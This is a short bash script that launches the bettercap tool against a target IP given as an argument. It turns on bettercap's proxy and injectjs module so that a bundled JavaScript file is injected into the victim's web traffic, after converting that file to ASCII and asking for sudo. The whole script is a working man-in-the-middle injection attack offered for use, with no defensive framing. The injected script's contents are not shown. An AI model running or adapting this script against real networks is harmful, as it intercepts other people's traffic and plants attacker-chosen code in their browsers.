#!/bin/bash

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

SOURCEIP=$1

iconv -f utf-8 -t ascii//TRANSLIT $BASEDIR/dist/main.js > $BASEDIR/dist/main2.js
mv -f $BASEDIR/dist/main2.js $BASEDIR/dist/main.js

echo "[*] Bettercap needs sudo privileges. Please enter your user password."
sudo bettercap -T ${SOURCEIP} --proxy --proxy-module injectjs --js-file $BASEDIR/dist/main.js
